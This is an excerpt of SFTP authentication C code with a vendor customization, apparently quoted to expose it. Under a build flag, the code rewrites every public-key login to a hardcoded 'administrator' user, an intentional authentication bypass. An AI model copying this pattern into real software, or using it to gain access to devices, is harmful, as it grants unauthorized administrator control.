 ...
 * source distribution.
 *
 * $Id: auth.c,v 1.38.2.7 2013/01/10 02:06:56 castaglia Exp $
 */
...
static int handle_userauth_req(struct ssh2_packet *pkt, char **service) {
  ...
  config_rec *c;
#ifdef MSTC_TO2_GERMANY_CUSTOMIZATION  /*Allow any user login with right public key, HsuanYu, 20130630*/
    #if 1 /*change "admin" to "administrator" in /etc/passwd, so admin can not find in /etc/passwd, MSTC ShihYu, 20140731*/
    char user_fake[14]="administrator";
    #else
    char user_fake[6]="admin";
    #endif
#endif
  buf = pkt->payload;
...
#ifdef MSTC_TO2_GERMANY_CUSTOMIZATION /*Allow any user login with right public key, HsuanYu, 20130630*/
        #if 1 /*change "admin" to "administrator" in /etc/passwd, so admin can not find in /etc/passwd, MSTC ShihYu, 20140731*/
        res = sftp_auth_publickey(pkt, pass_cmd, orig_user, "administrator", *service,
        &buf, &buflen, &send_userauth_fail);
        #else
        res = sftp_auth_publickey(pkt, pass_cmd, orig_user, "admin", *service,
        &buf, &buflen, &send_userauth_fail);
        #endif
#else
...
#ifdef MSTC_TO2_GERMANY_CUSTOMIZATION /*Allow any user login with right public key, HsuanYu, 20130630*/
    if (strncmp(method, "publickey", 10) == 0)
    user=user_fake;
#endif
